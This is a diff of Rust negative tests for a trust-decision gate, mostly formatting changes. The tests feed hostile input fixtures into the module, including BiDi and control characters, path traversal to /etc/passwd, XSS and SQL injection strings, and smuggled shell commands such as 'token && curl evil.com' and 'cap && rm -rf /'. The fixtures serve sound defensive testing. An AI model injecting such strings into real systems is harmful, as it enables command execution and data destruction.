@@ -406,39 +406,45 @@ impl TrustComplexityGate {
             self.decisions
                 .iter()
                 .filter(|d| d.outcome == TrustOutcome::Grant)
-                .count()
-        ).unwrap_or(u64::MAX);
+                .count(),
+        )
+        .unwrap_or(u64::MAX);
         let denials = u64::try_from(
             self.decisions
                 .iter()
                 .filter(|d| d.outcome == TrustOutcome::Deny)
-                .count()
-        ).unwrap_or(u64::MAX);
+                .count(),
+        )
+        .unwrap_or(u64::MAX);
         let escalations = u64::try_from(
             self.decisions
                 .iter()
                 .filter(|d| d.outcome == TrustOutcome::Escalate)
-                .count()
-        ).unwrap_or(u64::MAX);
+                .count(),
+        )
+        .unwrap_or(u64::MAX);
         let degraded = u64::try_from(
             self.decisions
                 .iter()
                 .filter(|d| d.outcome == TrustOutcome::Degraded)
-                .count()
-        ).unwrap_or(u64::MAX);
+                .count(),
+        )
+        .unwrap_or(u64::MAX);
 
         let replay_verified = u64::try_from(
             self.replay_results
                 .iter()
                 .filter(|r| r.deterministic)
-                .count()
-        ).unwrap_or(u64::MAX);
+                .count(),
+        )
+        .unwrap_or(u64::MAX);
         let replay_diverged = u64::try_from(
             self.replay_results
                 .iter()
                 .filter(|r| !r.deterministic)
-                .count()
-        ).unwrap_or(u64::MAX);
+                .count(),
+        )
+        .unwrap_or(u64::MAX);
         let budget_exceeded = self.budget_exceeded_count;
 
         let total_depth: u64 = self.decisions.iter().fold(0u64, |acc, d| {
@@ -461,8 +467,9 @@ impl TrustComplexityGate {
             self.events
                 .iter()
                 .filter(|e| e.code == RTC_003_DEGRADED_MODE)
-                .count()
-        ).unwrap_or(u64::MAX);
+                .count(),
+        )
+        .unwrap_or(u64::MAX);
 
         TrustAuditSummary {
             total_decisions: total,
@@ -1448,12 +1455,27 @@ mod tests {
         // Test BiDi override and control character injection in trust decision data
         let mut gate = TrustComplexityGate::default();
 
-        let malicious_decision_id = format!("decision-{}\u{202e}evil\u{202d}-{}", "\u{200b}".repeat(500), "🚀".repeat(300));
-        let malicious_endpoint = format!("endpoint-{}\u{2066}hidden\u{2069}-{}", "\u{feff}".repeat(100), "💥".repeat(200));
-        let malicious_token = format!("token-{}\u{200f}rtl\u{200e}-{}", "🔥".repeat(100), "\u{202a}ltr\u{202c}".repeat(50));
+        let malicious_decision_id = format!(
+            "decision-{}\u{202e}evil\u{202d}-{}",
+            "\u{200b}".repeat(500),
+            "🚀".repeat(300)
+        );
+        let malicious_endpoint = format!(
+            "endpoint-{}\u{2066}hidden\u{2069}-{}",
+            "\u{feff}".repeat(100),
+            "💥".repeat(200)
+        );
+        let malicious_token = format!(
+            "token-{}\u{200f}rtl\u{200e}-{}",
+            "🔥".repeat(100),
+            "\u{202a}ltr\u{202c}".repeat(50)
+        );
 
         let malicious_capabilities = vec![
-            format!("cap-{}\u{1f4a9}\u{200d}\u{1f525}", "\u{202e}RLO\u{202d}".repeat(50)),
+            format!(
+                "cap-{}\u{1f4a9}\u{200d}\u{1f525}",
+                "\u{202e}RLO\u{202d}".repeat(50)
+            ),
             format!("cap-{}\x1b[31mred\x1b[0m", "\u{2066}LRI\u{2069}".repeat(30)),
             format!("cap-{}", "unicode-flood".repeat(1000)),
         ];
@@ -1479,7 +1501,10 @@ mod tests {
 
         // Verify stored decision handles massive Unicode safely
         assert_eq!(gate.decisions().len(), 1);
-        assert_eq!(gate.decisions()[0].context.decision_id, malicious_decision_id);
+        assert_eq!(
+            gate.decisions()[0].context.decision_id,
+            malicious_decision_id
+        );
         assert!(gate.decisions()[0].context.decision_id.chars().count() > 800);
 
         // Test display safety (no panic on format)
@@ -1514,7 +1539,11 @@ mod tests {
         // Create massive capability set payload
         let mut massive_capabilities = Vec::new();
         for i in 0..10000 {
-            massive_capabilities.push(format!("capability_{}_with_very_long_name_{}", i, "z".repeat(1000)));
+            massive_capabilities.push(format!(
+                "capability_{}_with_very_long_name_{}",
+                i,
+                "z".repeat(1000)
+            ));
         }
 
         // Stress test with many oversized trust decisions
@@ -1525,7 +1554,11 @@ mod tests {
                 token: format!("{massive_token}-{i}"),
                 epoch: i as u64,
                 capability_set: massive_capabilities.clone(),
-                clock_value: format!("2026-01-{:02}T00:00:00Z-{}", (i % 28) + 1, "ts".repeat(10000)),
+                clock_value: format!(
+                    "2026-01-{:02}T00:00:00Z-{}",
+                    (i % 28) + 1,
+                    "ts".repeat(10000)
+                ),
                 chain_depth: (i % 5) as u32,
             };
 
@@ -1538,7 +1571,11 @@ mod tests {
                     _ => TrustOutcome::Degraded,
                 },
                 reason: format!("reason-{}-{}", i, "massive-payload".repeat(5000)),
-                decided_at: format!("2026-01-{:02}T01:00:00Z-{}", (i % 28) + 1, "decided".repeat(10000)),
+                decided_at: format!(
+                    "2026-01-{:02}T01:00:00Z-{}",
+                    (i % 28) + 1,
+                    "decided".repeat(10000)
+                ),
             };
 
             let record_result = gate.record_decision(massive_decision);
@@ -1549,9 +1586,18 @@ mod tests {
         assert!(gate.decisions().len() <= MAX_DECISIONS);
 
         // Verify memory usage is bounded despite massive payloads
-        let total_decision_size: usize = gate.decisions().iter()
-            .map(|d| d.context.decision_id.len() + d.context.endpoint_group.len() +
-                     d.context.capability_set.iter().map(|c| c.len()).sum::<usize>())
+        let total_decision_size: usize = gate
+            .decisions()
+            .iter()
+            .map(|d| {
+                d.context.decision_id.len()
+                    + d.context.endpoint_group.len()
+                    + d.context
+                        .capability_set
+                        .iter()
+                        .map(|c| c.len())
+                        .sum::<usize>()
+            })
             .sum();
         assert!(total_decision_size < 100_000_000); // Reasonable memory bound
 
@@ -1693,7 +1739,11 @@ mod tests {
 
         // Test degraded mode with extreme durations
         let mut degraded_gate = TrustComplexityGate::new(ComplexityBudget::default(), u64::MAX);
-        degraded_gate.enter_degraded_mode("extreme-duration", vec!["cap".to_string()], "2026-01-01T00:00:00Z");
+        degraded_gate.enter_degraded_mode(
+            "extreme-duration",
+            vec!["cap".to_string()],
+            "2026-01-01T00:00:00Z",
+        );
         degraded_gate.update_degraded_elapsed(u64::MAX - 1);
         assert!(degraded_gate.is_degraded_expired()); // Should handle extreme elapsed time
 
@@ -1727,7 +1777,11 @@ mod tests {
             // Unicode variants
             ("decision\u{200b}-1", "decision-1", TrustOutcome::Grant),
             ("decision-1\u{feff}", "decision-1", TrustOutcome::Grant),
-            ("decision\u{202e}-1\u{202d}", "decision-1", TrustOutcome::Grant),
+            (
+                "decision\u{202e}-1\u{202d}",
+                "decision-1",
+                TrustOutcome::Grant,
+            ),
             // NULL byte injection
             ("decision-1\0collision", "decision-1", TrustOutcome::Grant),
         ];
@@ -1790,7 +1844,10 @@ mod tests {
                                 token: format!("token-{thread_id}"),
                                 epoch: thread_id as u64,
                                 capability_set: vec![format!("cap-{thread_id}")],
-                                clock_value: format!("2026-01-{:02}T00:00:00Z", (thread_id % 28) + 1),
+                                clock_value: format!(
+                                    "2026-01-{:02}T00:00:00Z",
+                                    (thread_id % 28) + 1
+                                ),
                                 chain_depth: thread_id as u32 % 3,
                             },
                             outcome: match thread_id % 4 {
@@ -1822,13 +1879,17 @@ mod tests {
                     || {
                         let mut g = gate_clone.lock().unwrap();
                         if thread_id % 3 == 0 {
-                            g.enter_degraded_mode("concurrent test", vec![format!("cap-{thread_id}")], "ts");
+                            g.enter_degraded_mode(
+                                "concurrent test",
+                                vec![format!("cap-{thread_id}")],
+                                "ts",
+                            );
                         } else if thread_id % 3 == 1 {
                             g.update_degraded_elapsed(thread_id as u64);
                         } else {
                             g.exit_degraded_mode();
                         }
-                    }
+                    },
                 ];
 
                 // Perform multiple operations in this thread
@@ -1873,13 +1934,35 @@ mod tests {
         // Create data with format specifiers and injection attempts
         let malicious_inputs = [
             ("decision-{}", "endpoint-{}", "reason-{}", "decided-%s"),
-            ("decision\n\tmalicious", "endpoint\x00null", "reason\r\nCRLF", "decided\x1b[H"),
-            ("decision%n%s%d", "endpoint%x%p", "reason%c%u", "decided%ld%zu"),
-            ("decision\x1b[31mred\x1b[0m", "endpoint\x1b[1mbold\x1b[0m", "reason\x1b[?1049h", "decided\x1b[2J"),
-            ("decision\u{1f4a9}\u{200d}\u{1f525}", "endpoint\u{202e}RLO\u{202d}", "reason\u{2066}LRI\u{2069}", "decided\u{200f}RTL\u{200e}"),
+            (
+                "decision\n\tmalicious",
+                "endpoint\x00null",
+                "reason\r\nCRLF",
+                "decided\x1b[H",
+            ),
+            (
+                "decision%n%s%d",
+                "endpoint%x%p",
+                "reason%c%u",
+                "decided%ld%zu",
+            ),
+            (
+                "decision\x1b[31mred\x1b[0m",
+                "endpoint\x1b[1mbold\x1b[0m",
+                "reason\x1b[?1049h",
+                "decided\x1b[2J",
+            ),
+            (
+                "decision\u{1f4a9}\u{200d}\u{1f525}",
+                "endpoint\u{202e}RLO\u{202d}",
+                "reason\u{2066}LRI\u{2069}",
+                "decided\u{200f}RTL\u{200e}",
+            ),
         ];
 
-        for (i, (decision_id, endpoint, reason, decided_at)) in malicious_inputs.into_iter().enumerate() {
+        for (i, (decision_id, endpoint, reason, decided_at)) in
+            malicious_inputs.into_iter().enumerate()
+        {
             let malicious_context = TrustDecisionContext {
                 decision_id: decision_id.to_string(),
                 endpoint_group: endpoint.to_string(),
@@ -1907,7 +1990,10 @@ mod tests {
         // Test display safety - should not panic or produce control sequences
         for decision in gate.decisions() {
             let debug_str = format!("{:?}", decision);
-            assert!(!debug_str.contains('\x00'), "Debug output should escape null bytes");
+            assert!(
+                !debug_str.contains('\x00'),
+                "Debug output should escape null bytes"
+            );
             assert!(!debug_str.contains('\r'), "Debug should escape CRLF");
             assert!(!debug_str.contains('\n'), "Debug should escape newlines");
 
@@ -1919,7 +2005,10 @@ mod tests {
         // Test audit event display safety
         for event in gate.events() {
             let event_debug = format!("{:?}", event);
-            assert!(!event_debug.contains('\x1b'), "Event debug should escape ANSI");
+            assert!(
+                !event_debug.contains('\x1b'),
+                "Event debug should escape ANSI"
+            );
 
             let detail_display = format!("{}", event.detail);
             assert!(detail_display.len() > 0);
@@ -1928,14 +2017,20 @@ mod tests {
         // Test summary display safety
         let summary = gate.summary();
         let summary_debug = format!("{:?}", summary);
-        assert!(!summary_debug.contains('\x00'), "Summary debug should be safe");
+        assert!(
+            !summary_debug.contains('\x00'),
+            "Summary debug should be safe"
+        );
         assert!(summary.avg_chain_depth.is_finite());
         assert!(summary.replay_success_rate_pct.is_finite());
 
         // Test report generation display safety
         let report = gate.to_report();
         let report_str = report.to_string();
-        assert!(!report_str.contains('\x00'), "Report should escape control chars");
+        assert!(
+            !report_str.contains('\x00'),
+            "Report should escape control chars"
+        );
         assert!(report_str.len() > 50);
 
         // Test replay with malicious display data
@@ -1993,8 +2088,16 @@ mod tests {
                     2 => TrustOutcome::Escalate,
                     _ => TrustOutcome::Degraded,
                 },
-                reason: if i == 0 { String::new() } else { format!("boundary-{i}") },
-                decided_at: if i == 0 { String::new() } else { "2026-01-01T00:00:00Z".to_string() },
+                reason: if i == 0 {
+                    String::new()
+                } else {
+                    format!("boundary-{i}")
+                },
+                decided_at: if i == 0 {
+                    String::new()
+                } else {
+                    "2026-01-01T00:00:00Z".to_string()
+                },
             };
 
             let record_result = gate.record_decision(boundary_decision);
@@ -2003,9 +2106,9 @@ mod tests {
 
         // Test boundary complexity budgets
         let boundary_budgets = [
-            ComplexityBudget::new(0),           // Zero budget
-            ComplexityBudget::new(1),           // Minimal budget
-            ComplexityBudget::new(u32::MAX),    // Maximum budget
+            ComplexityBudget::new(0),        // Zero budget
+            ComplexityBudget::new(1),        // Minimal budget
+            ComplexityBudget::new(u32::MAX), // Maximum budget
         ];
 
         for (i, budget) in boundary_budgets.into_iter().enumerate() {
@@ -2023,7 +2126,8 @@ mod tests {
         // Test boundary degraded mode durations
         let boundary_durations = [0, 1, u64::MAX];
         for (i, duration) in boundary_durations.iter().enumerate() {
-            let mut duration_gate = TrustComplexityGate::new(ComplexityBudget::default(), *duration);
+            let mut duration_gate =
+                TrustComplexityGate::new(ComplexityBudget::default(), *duration);
             duration_gate.enter_degraded_mode("boundary", vec![], "ts");
             duration_gate.update_degraded_elapsed(*duration);
 
@@ -2050,7 +2154,10 @@ mod tests {
                 token: long_str.clone(),
                 epoch: i as u64,
                 capability_set: vec![long_str.clone()],
-                clock_value: format!("2026-01-01T00:00:00Z-{}", &long_str[..std::cmp::min(50, long_str.len())]),
+                clock_value: format!(
+                    "2026-01-01T00:00:00Z-{}",
+                    &long_str[..std::cmp::min(50, long_str.len())]
+                ),
                 chain_depth: 1,
             };
 
@@ -2083,610 +2190,631 @@ mod tests {
     }
 }
 
-    #[test]
-    fn negative_unicode_injection_in_trust_decision_identifiers() {
-        // Test trust decision identifiers with Unicode and malicious content
-        let mut controller = TrustComplexityController::new(100, 1000);
+#[test]
+fn negative_unicode_injection_in_trust_decision_identifiers() {
+    // Test trust decision identifiers with Unicode and malicious content
+    let mut controller = TrustComplexityController::new(100, 1000);
 
-        let malicious_decision_cases = vec![
-            // Unicode scripts
-            ("决定🚀rocket", "endpoint-🔥fire", "token-⚡lightning"),
-            ("решение-кириллица", "эндпоинт-тест", "токен-безопасность"),
-            ("決定-日本語", "エンドポイント-テスト", "トークン-セキュリティ"),
+    let malicious_decision_cases = vec![
+        // Unicode scripts
+        ("决定🚀rocket", "endpoint-🔥fire", "token-⚡lightning"),
+        ("решение-кириллица", "эндпоинт-тест", "токен-безопасность"),
+        (
+            "決定-日本語",
+            "エンドポイント-テスト",
+            "トークン-セキュリティ",
+        ),
+        // Control characters and injection
+        (
+            "decision\0null",
+            "endpoint\r\ninjection",
+            "token\x01control",
+        ),
+        (
+            "decision\u{200B}invisible",
+            "endpoint\u{FEFF}bom",
+            "token\u{202E}rtl",
+        ),
+        // Path traversal attempts
+        ("../../../etc/passwd", "endpoint", "token"),
+        ("decision", "../../../proc/version", "token"),
+        ("decision", "endpoint", "../../../../bin/sh"),
+        // Script injection attempts
+        ("decision<script>alert(1)</script>", "endpoint", "token"),
+        ("decision", "endpoint'; DROP TABLE decisions; --", "token"),
+        ("decision", "endpoint", "token && curl evil.com"),
+        // Extremely long identifiers
+        (&"x".repeat(100_000), "endpoint", "token"),
+        ("decision", &"y".repeat(100_000), "token"),
+        ("decision", "endpoint", &"z".repeat(100_000)),
+        // Binary data injection
+        (
+            &format!("decision{}", String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD])),
+            "endpoint",
+            "token",
+        ),
+        ("decision", "endpoint\x00\x01\x02", "token"),
+    ];
 
-            // Control characters and injection
-            ("decision\0null", "endpoint\r\ninjection", "token\x01control"),
-            ("decision\u{200B}invisible", "endpoint\u{FEFF}bom", "token\u{202E}rtl"),
+    for (i, (decision_id, endpoint_group, token)) in malicious_decision_cases.iter().enumerate() {
+        let malicious_context = TrustDecisionContext {
+            decision_id: decision_id.to_string(),
+            endpoint_group: endpoint_group.to_string(),
+            token: token.to_string(),
+            epoch: i as u64 + 1,
+            capability_set: vec![
+                format!("capability-{}", i),
+                format!("unicode-cap-{}", decision_id),
+            ],
+            clock_value: format!("2026-01-{:02}T00:00:00Z", (i % 28) + 1),
+            chain_depth: i as u32,
+        };
 
-            // Path traversal attempts
-            ("../../../etc/passwd", "endpoint", "token"),
-            ("decision", "../../../proc/version", "token"),
-            ("decision", "endpoint", "../../../../bin/sh"),
+        let malicious_decision = TrustDecision {
+            context: malicious_context,
+            outcome: match i % 4 {
+                0 => TrustOutcome::Grant,
+                1 => TrustOutcome::Deny,
+                2 => TrustOutcome::Escalate,
+                _ => TrustOutcome::Degraded,
+            },
+            reason: format!("Unicode test reason {}", i),
+            decided_at: format!("2026-01-{:02}T01:00:00Z", (i % 28) + 1),
+        };
 
-            // Script injection attempts
-            ("decision<script>alert(1)</script>", "endpoint", "token"),
-            ("decision", "endpoint'; DROP TABLE decisions; --", "token"),
-            ("decision", "endpoint", "token && curl evil.com"),
+        let record_result = controller.record_decision(malicious_decision);
 
-            // Extremely long identifiers
-            (&"x".repeat(100_000), "endpoint", "token"),
-            ("decision", &"y".repeat(100_000), "token"),
-            ("decision", "endpoint", &"z".repeat(100_000)),
+        match record_result {
+            Ok(()) => {
+                // Successfully recorded - verify no corruption
+            }
+            Err(_) => {
+                // Acceptable to reject malformed input
+            }
+        }
+    }
 
-            // Binary data injection
-            (&format!("decision{}", String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD])), "endpoint", "token"),
-            ("decision", "endpoint\x00\x01\x02", "token"),
-        ];
+    // Audit log should handle Unicode content safely
+    let events = controller.events();
+    for event in events {
+        assert!(!event.event_code.is_empty());
+        // Should not be corrupted by Unicode injection
+    }
 
-        for (i, (decision_id, endpoint_group, token)) in malicious_decision_cases.iter().enumerate() {
-            let malicious_context = TrustDecisionContext {
-                decision_id: decision_id.to_string(),
-                endpoint_group: endpoint_group.to_string(),
-                token: token.to_string(),
-                epoch: i as u64 + 1,
+    // Metrics should remain stable despite Unicode input
+    let metrics = controller.complexity_metrics();
+    assert!(
+        metrics.current_decisions
+            <= u32::try_from(malicious_decision_cases.len()).unwrap_or(u32::MAX)
+    );
+}
+
+#[test]
+fn negative_extreme_epoch_arithmetic_overflow_protection() {
+    // Test epoch handling with extreme values near u64::MAX
+    let mut controller = TrustComplexityController::new(50, 1000);
+
+    let extreme_epoch_cases = vec![
+        0,                             // Minimum epoch
+        1,                             // Just above minimum
+        u64::MAX.saturating_sub(1000), // Near maximum
+        u64::MAX.saturating_sub(1),    // One below maximum
+        u64::MAX,                      // Maximum epoch
+    ];
+
+    for (i, extreme_epoch) in extreme_epoch_cases.iter().enumerate() {
+        let extreme_context = TrustDecisionContext {
+            decision_id: format!("extreme-epoch-{}", i),
+            endpoint_group: "epoch-stress-test".to_string(),
+            token: format!("extreme-token-{}", i),
+            epoch: *extreme_epoch,
+            capability_set: vec![format!("epoch-cap-{}", extreme_epoch)],
+            clock_value: format!("2026-01-{:02}T00:00:00Z", (i % 28) + 1),
+            chain_depth: i as u32,
+        };
+
+        let extreme_decision = TrustDecision {
+            context: extreme_context,
+            outcome: TrustOutcome::Grant,
+            reason: format!("Extreme epoch test {}", extreme_epoch),
+            decided_at: format!("2026-01-{:02}T02:00:00Z", (i % 28) + 1),
+        };
+
+        let record_result = controller.record_decision(extreme_decision);
+
+        match record_result {
+            Ok(()) => {
+                // Successfully recorded extreme epoch
+            }
+            Err(_) => {
+                // May reject extreme values for safety
+            }
+        }
+    }
+
+    // Test replay with extreme epochs
+    for (i, extreme_epoch) in extreme_epoch_cases.iter().enumerate() {
+        let decision_id = format!("extreme-epoch-{}", i);
+        let replay_result = controller.replay_decision(&decision_id, |original_context| {
+            // Return same context to avoid divergence
+            Ok(TrustDecisionContext {
+                epoch: *extreme_epoch, // Use extreme epoch
+                ..original_context.clone()
+            })
+        });
+
+        match replay_result {
+            Ok(result) => {
+                // Should handle extreme epochs without arithmetic overflow
+                assert_eq!(result.original_outcome, result.replayed_outcome);
+                assert!(result.is_deterministic);
+            }
+            Err(_) => {
+                // May fail if decision wasn't recorded due to extreme epoch
+            }
+        }
+    }
+
+    // Metrics should handle extreme epochs safely
+    let metrics = controller.complexity_metrics();
+    assert!(metrics.replay_success_rate <= 1.0);
+    assert!(metrics.replay_success_rate >= 0.0);
+}
+
+#[test]
+fn negative_malformed_capability_set_injection_and_overflow() {
+    // Test capability sets with malformed, massive, and malicious content
+    let mut controller = TrustComplexityController::new(100, 1000);
+
+    let malformed_capability_sets = vec![
+        // Empty capability set
+        vec![],
+        // Massive capability set
+        (0..10_000)
+            .map(|i| format!("capability-{:06}", i))
+            .collect(),
+        // Capabilities with malicious content
+        vec![
+            "capability\0null-injection".to_string(),
+            "capability🚀unicode-attack".to_string(),
+            "../../../etc/passwd".to_string(),
+            "cap'; DROP TABLE capabilities; --".to_string(),
+            "cap && rm -rf /".to_string(),
+            "cap<script>alert('xss')</script>".to_string(),
+        ],
+        // Binary data in capabilities
+        vec![
+            String::from_utf8_lossy(b"\xFF\xFE\xFD\xFC").to_string(),
+            String::from_utf8_lossy(b"\x00\x01\x02\x03").to_string(),
+        ],
+        // Extremely long capability names
+        vec![
+            "x".repeat(1_000_000),
+            "capability-".to_string() + &"y".repeat(100_000),
+        ],
+        // Duplicate capabilities (potential deduplication issues)
+        vec![
+            "duplicate".to_string(),
+            "duplicate".to_string(),
+            "duplicate".to_string(),
+            "normal-cap".to_string(),
+            "duplicate".to_string(),
+        ],
+    ];
+
+    for (i, capability_set) in malformed_capability_sets.into_iter().enumerate() {
+        let malformed_context = TrustDecisionContext {
+            decision_id: format!("malformed-caps-{}", i),
+            endpoint_group: "capability-test".to_string(),
+            token: format!("cap-token-{}", i),
+            epoch: i as u64 + 1,
+            capability_set,
+            clock_value: format!("2026-01-{:02}T03:00:00Z", (i % 28) + 1),
+            chain_depth: i as u32,
+        };
+
+        let malformed_decision = TrustDecision {
+            context: malformed_context,
+            outcome: TrustOutcome::Grant,
+            reason: format!("Capability set test {}", i),
+            decided_at: format!("2026-01-{:02}T04:00:00Z", (i % 28) + 1),
+        };
+
+        let record_result = controller.record_decision(malformed_decision);
+
+        match record_result {
+            Ok(()) => {
+                // Successfully recorded - test replay
+                let decision_id = format!("malformed-caps-{}", i);
+                let replay_result = controller.replay_decision(&decision_id, |context| {
+                    // Return same context to test capability set handling
+                    Ok(context.clone())
+                });
+
+                match replay_result {
+                    Ok(result) => {
+                        assert!(result.is_deterministic);
+                    }
+                    Err(_) => {
+                        // May fail due to malformed capability sets
+                    }
+                }
+            }
+            Err(_) => {
+                // Acceptable to reject malformed capability sets
+            }
+        }
+    }
+
+    // Controller should remain stable despite malformed capability sets
+    let metrics = controller.complexity_metrics();
+    assert!(metrics.current_decisions <= 10); // Should have bounded acceptance
+}
+
+#[test]
+fn negative_degraded_mode_timing_and_duration_boundary_testing() {
+    // Test degraded mode with extreme timing and duration edge cases
+    let mut controller = TrustComplexityController::new(50, 500);
+
+    // Record decisions that will trigger degraded mode
+    for i in 0..5 {
+        let decision = make_decision(
+            &format!("degraded-trigger-{}", i),
+            TrustOutcome::Degraded,
+            i,
+        );
+        let _ = controller.record_decision(decision);
+    }
+
+    // Test degraded mode with extreme durations
+    let extreme_durations = vec![
+        0,                             // Zero duration (immediate expiry)
+        1,                             // Minimal duration
+        u64::MAX.saturating_sub(1000), // Near maximum duration
+        u64::MAX,                      // Maximum duration
+    ];
+
+    for (i, duration_ms) in extreme_durations.iter().enumerate() {
+        let degraded_result = controller.enter_degraded_mode(
+            format!("extreme-degraded-{}", i),
+            *duration_ms,
+            1000 + i as u64,
+        );
+
+        match degraded_result {
+            Ok(()) => {
+                // Test decisions in degraded mode
+                let degraded_decision = TrustDecision {
+                    context: TrustDecisionContext {
+                        decision_id: format!("during-degraded-{}", i),
+                        endpoint_group: "degraded-endpoint".to_string(),
+                        token: format!("degraded-token-{}", i),
+                        epoch: 100 + i as u64,
+                        capability_set: vec!["degraded-cap".to_string()],
+                        clock_value: format!("2026-01-{:02}T05:00:00Z", (i % 28) + 1),
+                        chain_depth: 0,
+                    },
+                    outcome: TrustOutcome::Degraded,
+                    reason: format!("Degraded mode decision with duration {}", duration_ms),
+                    decided_at: format!("2026-01-{:02}T06:00:00Z", (i % 28) + 1),
+                };
+
+                let record_result = controller.record_decision(degraded_decision);
+
+                // Should handle degraded mode decisions
+                match record_result {
+                    Ok(()) => {}
+                    Err(_) => {
+                        // May reject decisions in degraded mode
+                    }
+                }
+
+                // Test degraded mode exit with extreme timestamps
+                let extreme_exit_time = match duration_ms {
+                    &u64::MAX => u64::MAX.saturating_sub(100), // Avoid overflow
+                    &0 => 2000 + i as u64,                     // Already expired
+                    _ => 1000 + i as u64 + duration_ms,        // Normal expiry
+                };
+
+                let exit_result = controller
+                    .exit_degraded_mode(&format!("extreme-degraded-{}", i), extreme_exit_time);
+
+                match exit_result {
+                    Ok(()) => {
+                        // Successfully exited degraded mode
+                    }
+                    Err(_) => {
+                        // May fail due to timing issues or extreme values
+                    }
+                }
+            }
+            Err(_) => {
+                // Acceptable to reject extreme durations
+            }
+        }
+    }
+
+    // Metrics should handle extreme timing safely
+    let metrics = controller.complexity_metrics();
+    assert!(metrics.degraded_mode_entries < u32::MAX); // Should not overflow
+}
+
+#[test]
+fn negative_replay_function_corruption_and_determinism_violation() {
+    // Test replay function behavior with corrupted and non-deterministic responses
+    let mut controller = TrustComplexityController::new(100, 1000);
+
+    // Record some baseline decisions
+    for i in 0..5 {
+        let decision = make_decision(&format!("replay-test-{}", i), TrustOutcome::Grant, i);
+        controller
+            .record_decision(decision)
+            .expect("record decision");
+    }
+
+    // Test replay with various corruption scenarios
+    let corruption_scenarios = vec![
+        // Return completely different context
+        ("different_context", |original: TrustDecisionContext| {
+            Ok(TrustDecisionContext {
+                decision_id: "CORRUPTED".to_string(),
+                endpoint_group: "EVIL".to_string(),
+                token: "HACKED".to_string(),
+                epoch: u64::MAX,
+                capability_set: vec!["admin".to_string(), "root".to_string()],
+                clock_value: "1970-01-01T00:00:00Z".to_string(),
+                chain_depth: original.chain_depth.saturating_add(9999),
+            })
+        }),
+        // Return error occasionally (non-deterministic)
+        ("intermittent_error", |_: TrustDecisionContext| {
+            Err("Simulated intermittent failure".to_string())
+        }),
+        // Modify epoch in non-deterministic way
+        ("epoch_manipulation", |mut context: TrustDecisionContext| {
+            context.epoch = context.epoch.saturating_mul(2).saturating_add(1);
+            Ok(context)
+        }),
+        // Inject massive capability sets
+        ("capability_flood", |mut context: TrustDecisionContext| {
+            context.capability_set = (0..10_000)
+                .map(|i| format!("injected-cap-{:06}", i))
+                .collect();
+            Ok(context)
+        }),
+        // Unicode injection in replayed context
+        ("unicode_injection", |mut context: TrustDecisionContext| {
+            context.decision_id = format!("🚀{}", context.decision_id);
+            context.endpoint_group = format!("攻击-{}", context.endpoint_group);
+            context.token = format!("кибер-{}", context.token);
+            Ok(context)
+        }),
+    ];
+
+    for (scenario_name, replay_func) in corruption_scenarios {
+        for i in 0..5 {
+            let decision_id = format!("replay-test-{}", i);
+            let replay_result = controller.replay_decision(&decision_id, &replay_func);
+
+            match replay_result {
+                Ok(result) => {
+                    // If replay succeeded, verify determinism detection
+                    match scenario_name {
+                        "different_context" | "epoch_manipulation" | "capability_flood"
+                        | "unicode_injection" => {
+                            // Should detect non-determinism due to context changes
+                            assert!(
+                                !result.is_deterministic,
+                                "Should detect non-determinism in scenario: {}",
+                                scenario_name
+                            );
+                            assert_ne!(result.original_outcome, result.replayed_outcome);
+                        }
+                        _ => {
+                            // Other scenarios may or may not be deterministic
+                        }
+                    }
+                }
+                Err(TrustComplexityError::ReplayFailed { .. }) => {
+                    // Expected for intermittent_error scenario
+                    assert_eq!(scenario_name, "intermittent_error");
+                }
+                Err(_) => {
+                    // Other errors acceptable for corrupted inputs
+                }
+            }
+        }
+    }
+
+    // Metrics should track replay attempts and failures
+    let metrics = controller.complexity_metrics();
+    assert!(metrics.total_replays > 0);
+}
+
+#[test]
+fn negative_audit_log_memory_exhaustion_under_decision_burst() {
+    // Test audit log behavior under rapid decision recording bursts
+    let mut controller = TrustComplexityController::new(1000, 5000);
+
+    // Generate decision bursts far exceeding normal capacity
+    let burst_cycles = 50;
+    let decisions_per_cycle = 200;
+
+    for cycle in 0..burst_cycles {
+        for decision_num in 0..decisions_per_cycle {
+            let decision_id = format!("burst-{:03}-{:04}", cycle, decision_num);
+            let decision_context = TrustDecisionContext {
+                decision_id: decision_id.clone(),
+                endpoint_group: format!("burst-endpoint-{}", cycle),
+                token: format!("burst-token-{}-{}", cycle, decision_num),
+                epoch: cycle as u64 * 1000 + decision_num as u64,
                 capability_set: vec![
-                    format!("capability-{}", i),
-                    format!("unicode-cap-{}", decision_id),
+                    format!("burst-cap-{}", cycle),
+                    format!("decision-cap-{}", decision_num),
                 ],
-                clock_value: format!("2026-01-{:02}T00:00:00Z", (i % 28) + 1),
-                chain_depth: i as u32,
+                clock_value: format!(
+                    "2026-{:02}-{:02}T{:02}:00:00Z",
+                    (cycle % 12) + 1,
+                    (decision_num % 28) + 1,
+                    decision_num % 24
+                ),
+                chain_depth: (cycle + decision_num) as u32,
             };
 
-            let malicious_decision = TrustDecision {
-                context: malicious_context,
-                outcome: match i % 4 {
+            let decision = TrustDecision {
+                context: decision_context,
+                outcome: match (cycle + decision_num) % 4 {
                     0 => TrustOutcome::Grant,
                     1 => TrustOutcome::Deny,
                     2 => TrustOutcome::Escalate,
                     _ => TrustOutcome::Degraded,
                 },
-                reason: format!("Unicode test reason {}", i),
-                decided_at: format!("2026-01-{:02}T01:00:00Z", (i % 28) + 1),
+                reason: format!("Burst decision {}-{}", cycle, decision_num),
+                decided_at: format!(
+                    "2026-{:02}-{:02}T{:02}:30:00Z",
+                    (cycle % 12) + 1,
+                    (decision_num % 28) + 1,
+                    decision_num % 24
+                ),
             };
 
-            let record_result = controller.record_decision(malicious_decision);
+            let record_result = controller.record_decision(decision);
 
             match record_result {
-                Ok(()) => {
-                    // Successfully recorded - verify no corruption
-                },
+                Ok(()) => {}
+                Err(TrustComplexityError::BudgetExceeded { .. }) => {
+                    // Expected when budget exceeded
+                    break;
+                }
                 Err(_) => {
-                    // Acceptable to reject malformed input
+                    // Other capacity errors acceptable under burst
+                    break;
                 }
             }
         }
 
-        // Audit log should handle Unicode content safely
-        let events = controller.events();
-        for event in events {
-            assert!(!event.event_code.is_empty());
-            // Should not be corrupted by Unicode injection
-        }
-
-        // Metrics should remain stable despite Unicode input
+        // Periodic complexity checks during burst
         let metrics = controller.complexity_metrics();
-        assert!(metrics.current_decisions <= u32::try_from(malicious_decision_cases.len()).unwrap_or(u32::MAX));
+        assert!(metrics.current_decisions <= MAX_DECISIONS as u32);
     }
 
-    #[test]
-    fn negative_extreme_epoch_arithmetic_overflow_protection() {
